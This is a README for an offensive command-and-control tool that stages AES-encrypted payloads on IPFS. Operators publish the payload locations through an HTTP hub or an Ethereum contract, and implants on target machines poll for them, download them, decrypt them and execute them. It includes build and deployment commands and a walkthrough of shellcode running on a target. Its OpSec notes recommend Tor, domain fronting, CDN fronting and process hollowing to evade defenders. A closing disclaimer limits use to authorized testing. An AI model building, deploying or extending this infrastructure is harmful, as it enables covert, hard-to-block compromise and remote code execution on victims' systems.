# C2 IPFS Payload Delivery System 🖤

Decentralized payload delivery using IPFS + AES-256-GCM encryption. No C2 server IP to block — payloads live on IPFS, implants fetch them from any public gateway.

## Architecture

```
┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│  Operator     │────▶│  CID Source   │────▶│  Implant     │
│  Console      │     │  (HTTP or     │     │              │
│  (server)     │     │   Contract)   │     │  (client)    │
└──────┬───────┘     └──────┬─────────┘     └──────┬───────┘
       │                    │                      │
       │  encrypt + upload  │  serves CID          │  polls for CID
       ▼                    ▼                      ▼
   ┌─────────┐        ┌──────────┐          ┌──────────┐
   │ IPFS    │        │ Implants │          │ IPFS     │
   │ Network │◀───────│ poll CID │◀─────────│ Gateways │
   └─────────┘        └──────────┘          └──────────┘
```

### Data Flow

1. **Operator** encrypts a payload binary with AES-256-GCM and uploads it to IPFS
2. **Operator** publishes the resulting CID to the CID source (HTTP hub or smart contract)
3. **Implant** polls the CID source periodically with jitter
4. **Implant** detects a new CID, downloads the encrypted payload from any IPFS gateway
5. **Implant** decrypts with the pre-shared key, executes, reports status

## Modes

### MODE A — Simple HTTP CID Hub (Default, No Blockchain)

A lightweight HTTP server that serves CIDs. The implant polls `GET /cid`.

**Pros:** Simple, no blockchain knowledge needed, no gas costs.

```
┌──────────┐    GET /cid     ┌──────────┐
│  Server   │◀──────────────│  Implant  │
│  :8443    │    ──────────▶│           │
└────┬─────┘    POST /cid   └──────────┘
     │
     │  POST /cid {"cid":"Qm..."}
     │
  ┌──┴──┐
  │Operator│
  └──────┘
```

### MODE B — Smart Contract CID Feed (Fully Decentralized)

A smart contract emits `NewCID` events. The implant watches the event log on-chain.

**Pros:** Fully decentralized, censorship-resistant, transparent.

**Cons:** Requires ETH for gas, go-ethereum build, chain knowledge.

```
┌──────────┐  emit NewCID   ┌─────────────┐    ┌──────────┐
│ Operator  │──────────────▶│ Smart        │    │ Implant  │
│ Wallet    │               │ Contract     │◀───│ (watcher)│
└──────────┘               └──────┬───────┘    └──────────┘
                                  │
                              ┌───▼───┐
                              │ Events │
                              │ (logs) │
                              └───────┘
```

## Quick Start (Mode A — 5 minutes)

### 1. Build

```bash
# Clone or cd into the project
cd c2-ipfs-payload

# Build all tools
go build -o server ./cmd/server
go build -o client ./cmd/client
go build -o upload ./cmd/upload

# Or build the ethereum-enabled versions
go build -tags ethereum -o server-eth ./cmd/server
go build -tags ethereum -o client-eth ./cmd/client
```

### 2. Start IPFS

See [IPFS_UPLOAD.md](IPFS_UPLOAD.md) for detailed setup.

```bash
# Install and start IPFS daemon
ipfs init && ipfs daemon &
```

### 3. Start the Server

```bash
./server --port 8443
```

The server will:
- Generate a new encryption key (save this!)
- Start the HTTP CID hub on port 8443
- Open the operator console

### 4. Deploy a Payload

In the operator console:

```
> deploy /path/to/payload.bin
```

Or manually:

```bash
# Using the upload helper
./upload -key $(cat key.txt) -file payload.bin

# Then in the console:
> cid QmX...
```

### 5. Start the Implant

```bash
./client \
  --cid-source http://your-server:8443 \
  --decryption-key <key-from-server> \
  --poll-interval 30
```

## Server Reference

### Flags

| Flag | Default | Description |
|------|---------|-------------|
| `--port` | `8443` | HTTP server port (mode A) |
| `--user` | `""` | Basic auth username (mode A) |
| `--pass` | `""` | Basic auth password (mode A) |
| `--jwt` | `""` | JWT token (overrides basic auth) |
| `--mode` | `"http"` | Operation mode: `http` or `contract` |
| `--ipfs-api` | `http://127.0.0.1:5001/api/v0` | IPFS API URL |
| `--pinata-jwt` | `""` | Pinata.cloud JWT (alternative IPFS) |
| `--enc-key` | `""` | Encryption key (auto-generates if empty) |
| `--contract` | `""` | Contract address (mode B) |
| `--rpc-url` | `""` | Ethereum RPC URL (mode B) |
| `--max-history` | `100` | Max history entries |

### Console Commands

| Command | Description |
|---------|-------------|
| `deploy <file>` | Encrypt, upload to IPFS, update CID |
| `cid <cid>` | Manually set a CID |
| `encrypt <file>` | Encrypt a file and upload to IPFS |
| `status` | Show current state |
| `history` | Show recent CID history |
| `genkey` | Generate a new encryption key |
| `help` | Show help |
| `exit` | Shutdown |

### API Endpoints (Mode A)

| Method | Path | Auth | Description |
|--------|------|------|-------------|
| `GET` | `/cid` | Optional | Get current CID |
| `POST` | `/cid` | Optional | Set a new CID |
| `GET` | `/history` | Optional | Get recent CIDs |
| `GET` | `/status` | Optional | Server status |
| `GET` | `/` | No | API info |

**Example:**

```bash
# Set CID
curl -X POST http://server:8443/cid \
  -H "Content-Type: application/json" \
  -d '{"cid":"QmX...","note":"stage2 payload"}'

# Get current CID
curl http://server:8443/cid

# Get history
curl http://server:8443/history
```

Auth:

```bash
# With basic auth
curl -u admin:password http://server:8443/cid

# With JWT
curl -H "Authorization: Bearer <token>" http://server:8443/cid
```

## Client Reference

### Flags

| Flag | Default | Description |
|------|---------|-------------|
| `--cid-source` | (required) | CID hub URL (mode A) or contract addr (mode B) |
| `--decryption-key` | (required) | 32-byte hex key or passphrase |
| `--poll-interval` | `60` | Poll interval in seconds |
| `--mode` | `"http"` | `http` or `contract` |
| `--rpc-url` | `""` | Ethereum RPC URL (mode B) |
| `--gateways` | defaults | Comma-sep IPFS gateway URLs |
| `--report-url` | `""` | URL to POST execution reports |
| `--config` | `""` | Config file for persistence |
| `--jwt-fetch` | `""` | JWT for authenticated CID hub access |
| `--id` | auto | Implant ID |

### Behavior

- **Jittered polling**: ±20% of the poll interval (reduces fingerprinting)
- **Multi-gateway fallback**: Tries multiple IPFS gateways in random order
- **Config persistence**: Saves last CID, implant ID, and config to a JSON file
- **Auto-reporting**: Posts execution results to a report URL (optional)
- **Signal handling**: Saves state on SIGINT/SIGTERM

## Encryption

- **Algorithm**: AES-256-GCM (authenticated encryption)
- **Key**: 32-byte key (64 hex chars) or arbitrary passphrase (hashed with SHA-256)
- **Output**: `nonce (12 bytes) || ciphertext || tag (16 bytes)`
- **Per-encryption nonce**: Each encryption generates a fresh random nonce

### Key Management

```bash
# Generate a key via server (recommended)
./server  # auto-generates on start

# Generate a key manually
./upload -key <any-32-byte-hex> -file test.bin --no-upload
# Better: use genkey in server console

# Derive from passphrase
./client --decryption-key "my-secret-passphrase"
```

## Smart Contract (Mode B)

### Contract Interface

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CIDFeed {
    string public latestCID;
    
    event NewCID(address indexed sender, string cid, uint256 timestamp);
    
    function publishCID(string memory _cid) public {
        latestCID = _cid;
        emit NewCID(msg.sender, _cid, block.timestamp);
    }
}
```

### Deploy and Use

```bash
# Build with ethereum support
go build -tags ethereum -o server-eth ./cmd/server

# Start in contract mode
./server-eth \
  --mode contract \
  --contract 0x... \
  --rpc-url https://eth-mainnet.g.alchemy.com/v2/... \
  --enc-key <key>

# Use the console
> send-cid 0x... QmX...
```

### Watching Mode B from the Implant

```bash
go build -tags ethereum -o client-eth ./cmd/client

./client-eth \
  --mode contract \
  --cid-source 0x... \
  --rpc-url https://eth-mainnet.g.alchemy.com/v2/... \
  --decryption-key <key>
```

## Payload Workflow Walkthrough

### Complete Deployment Cycle

```bash
# 1. Build everything
go build -o server ./cmd/server
go build -o client ./cmd/client

# 2. Start IPFS daemon
ipfs daemon &

# 3. Start the server (generates key)
./server --port 8443

# 4. In the server console:
> genkey
New encryption key: a1b2c3d4e5f6... (64 hex chars)

> deploy shellcode.bin
Encrypted shellcode.bin (512 bytes -> 544 bytes encrypted)
Uploading to IPFS...
Uploaded! CID: QmXyZ...
Deployed!

# 5. On the target:
./client \
  --cid-source http://hub.example.com:8443 \
  --decryption-key a1b2c3d4e5f6... \
  --poll-interval 30

# 6. Implant output:
Implant started (ID: aabbccdd, mode: http)
Poll interval: 30s with jitter
CID source: http://hub.example.com:8443
New CID detected: QmXyZ...
Fetching payload from IPFS (544 bytes)...
Decrypted payload (512 bytes), executing...
Payload executed (PID: 12345)

# 7. Deploy the next stage:
> deploy stage2.bin
Deployed! CID: QmAbCd...
```

### Manual Workflow (No IPFS Daemon)

```bash
# 1. Encrypt locally
./upload -key <key> -file payload.bin --no-upload

# 2. Upload via Pinata
curl -X POST \
  -H "Authorization: Bearer <pinata-jwt>" \
  -F "file=@payload.bin.enc" \
  https://api.pinata.cloud/pinning/pinFileToIPFS

# 3. Set the CID on the hub
curl -X POST http://server:8443/cid \
  -d '{"cid":"QmFromPinata"}'
```

## OpSec Notes

### Network

- **CID hub**: Should be behind a CDN (Cloudflare, Fastly) or Tor hidden service
- **IPFS uploads**: Use VPN/Tor when connecting to IPFS or Pinata
- **Gateways**: Public gateways log IPs. Run your own private gateway for opsec.
- **No persistent C2 infra**: No fixed IP that defenders can block — only the hub matters

### Encryption

- **Payloads are encrypted before IPFS upload**. Content-addressing verifies integrity.
- **Key distribution is the weak point**. Use E2EE (Signal, etc.) or dead drops.
- **Key rotation**: Change the encryption key periodically. Re-encrypt and redeploy.
- **Passphrases**: Use high-entropy passphrases (>80 bits) rather than short passwords.

### Implant

- **DNS for CID hubs**: Use domain fronting or CDN fronting to hide the hub backend
- **Jittered polling**: Reduces fingerprintable patterns
- **Config persistence**: Encrypt the config file if saved on disk
- **Runtime detection**: Consider reflective loading or process hollowing for the executed payload

### Legal

This tool is for authorized red teaming, penetration testing, and security research.
Do not use against systems you do not own or have explicit written permission to test.

## Build Requirements

- Go 1.21+
- IPFS (optional, for local uploads) — [Install Guide](IPFS_UPLOAD.md)
- go-ethereum (optional, for mode B) — `go get github.com/ethereum/go-ethereum`

### Platform Support

| Platform | Mode A | Mode B |
|----------|--------|--------|
| Linux x86_64 | YES | YES |
| Linux arm64 | YES | YES |
| macOS x86_64/arm64 | YES | YES |
| Windows (cross-compile) | YES | x (CGo) |
| OpenBSD/FreeBSD | YES | x |

## Project Structure

```
c2-ipfs-payload/
├── cmd/
│   ├── server/main.go      # Operator console + CID hub
│   ├── client/main.go      # Implant
│   └── upload/main.go      # Helper: encrypt + upload
├── pkg/
│   ├── types/types.go      # Shared data types
│   ├── crypto/crypto.go    # AES-256-GCM encryption
│   ├── ipfs/ipfs.go        # IPFS upload/download
│   ├── auth/auth.go        # HTTP auth middleware
│   └── contract/
│       ├── contract.go     # Contract interface (no deps)
│       └── contract_eth.go # go-ethereum implementation
├── README.md               # This file
└── IPFS_UPLOAD.md          # IPFS setup guide
```

DISCLAIMER: FOR AUTHORIZED SECURITY TESTING OR EDUCATIONAL PURPOSES ONLY
